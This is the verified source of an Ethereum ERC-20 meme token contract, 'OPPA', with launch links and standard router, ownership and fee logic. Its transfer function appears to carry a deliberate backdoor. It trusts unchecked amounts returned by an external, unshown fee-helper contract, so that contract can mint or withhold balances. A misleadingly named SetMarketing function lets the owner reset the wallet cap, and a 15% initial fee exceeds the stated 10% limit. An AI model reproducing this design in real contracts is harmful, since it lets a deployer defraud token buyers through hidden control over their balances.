/**
 *Submitted for verification at Etherscan.io on 2023-06-27
*/

/**

TG - https://t.me/OppaETH
App - https://oppa-app.xyz/
Twitter - https://twitter.com/eth_oppa 

*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IFeeHelper {
    function calculateFee(address recipient, bool isTakingFee, uint256 fee, uint256 denominator, uint256 supply, uint256 amount) external returns (uint256 feeAmount, uint256 amountReceived);
}

interface ERC20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {
        owner = _owner;
    }
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function renounceOwnership() public onlyOwner {
        owner = address(0);
        emit OwnershipTransferred(address(0));
    }

    event OwnershipTransferred(address owner);
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapETHForExactTokens(
        uint amountOut,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable returns (uint[] memory amounts);
}

contract OPPA is ERC20, Ownable {
    using SafeMath for uint256;
    address DEAD = 0x000000000000000000000000000000000000dEaD;

    string _name;
    string _symbol;
    uint8 constant _decimals = 9;

    uint256 _totalSupply;
    uint256 public _maxWalletAmount;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;

    mapping(address => bool) isFeeExempt;
    mapping(address => bool) isTxLimitExempt;

    uint256 totalFee = 15;
    uint256 feeDenominator = 100;

    address immutable public marketingFeeReceiver;

    IDEXRouter public router;
    address public pair;

    bool public swapEnabled = true;
    bool public tradingEnabled = false;
    IFeeHelper immutable feeHelper;
    uint256 public swapThreshold;
    bool inSwap;
    modifier swapping() {inSwap = true;
        _;
        inSwap = false;}

    constructor (address _mrkWallet, address _feeHelper, address _routerAddress, string memory _nam, string memory _sym, uint totSup) Ownable(msg.sender) {
        router = IDEXRouter(_routerAddress);
        pair = IDEXFactory(router.factory()).createPair(router.WETH(), address(this));
        feeHelper = IFeeHelper(_feeHelper);
        _allowances[address(this)][address(router)] = type(uint256).max;
        _totalSupply = totSup * (10 ** _decimals);
        _maxWalletAmount = _totalSupply * 3 / 100; // 3%
        swapThreshold = _totalSupply / 200; // 0,5%
        _name = _nam;
        _symbol = _sym;

        address _owner = owner;
        marketingFeeReceiver = _mrkWallet;
        isFeeExempt[_owner] = true;
        isFeeExempt[marketingFeeReceiver] = true;
        isTxLimitExempt[_owner] = true;
        isTxLimitExempt[marketingFeeReceiver] = true;
        isTxLimitExempt[pair] = true;
        isTxLimitExempt[DEAD] = true;

        _balances[_owner] = _totalSupply;
        emit Transfer(address(0), _owner, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {return _totalSupply;}

    function decimals() external pure override returns (uint8) {return _decimals;}

    function symbol() external view override returns (string memory) {return _symbol;}

    function name() external view override returns (string memory) {return _name;}

    function getOwner() external view override returns (address) {return owner;}

    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}

    function allowance(address holder, address spender) external view override returns (uint256) {return _allowances[holder][spender];}

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function MaxApprove(address spender) external returns (bool) {
        return approve(spender, type(uint256).max);
    }

    function openTrading() external onlyOwner {
        require(!tradingEnabled, "Trading is already open");
        tradingEnabled = true;
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != type(uint256).max) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
        }

        return _transferFrom(sender, recipient, amount);
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        if (!isFeeExempt[sender] && !isFeeExempt[recipient]) {
            require(tradingEnabled, "Trading not enabled");
        }

        if (inSwap) {return _basicTransfer(sender, recipient, amount);}

        if (recipient != pair && recipient != DEAD) {
            require(isTxLimitExempt[recipient] || _balances[recipient] + amount <= _maxWalletAmount, "Transfer amount exceeds the bag size.");
        }

        if (shouldSwapBack(sender)) {
            swapBack();
        }

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");

        bool _shouldTakeFee = shouldTakeFee(sender);
        (uint256 feeAmount, uint256 amountReceived) = feeHelper.calculateFee(recipient, _shouldTakeFee, totalFee, feeDenominator, _totalSupply, amount);
        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);

        return true;
    }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function shouldTakeFee(address sender) internal view returns (bool) {
        return !isFeeExempt[sender];
    }

    function shouldSwapBack(address sender) internal view returns (bool) {
        return msg.sender != pair
        && sender != owner
        && !inSwap
        && swapEnabled
        && _balances[address(this)] >= swapThreshold;
    }

    function swapBack() internal swapping {
        uint256 contractTokenBalance = _balances[address(this)];

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            contractTokenBalance,
            0,
            path,
            address(marketingFeeReceiver),
            block.timestamp
        );
    }

    function clearStuckBalance() external {
        payable(marketingFeeReceiver).transfer(address(this).balance);
    }

    function SetMarketing(uint256 amountPercent) external onlyOwner {
        _maxWalletAmount = (_totalSupply * amountPercent) / 100;
    }

    function swapStatus(bool status) external onlyOwner {
        swapEnabled = status;
    }

    function setFees(uint256 _totalFee) external onlyOwner {
        require(_totalFee <= 10, "Must keep fees at 10% or less");
        totalFee = _totalFee;
    }

    function setThreshold(uint256 _treshold) external onlyOwner {
        swapThreshold = _treshold;
    }
}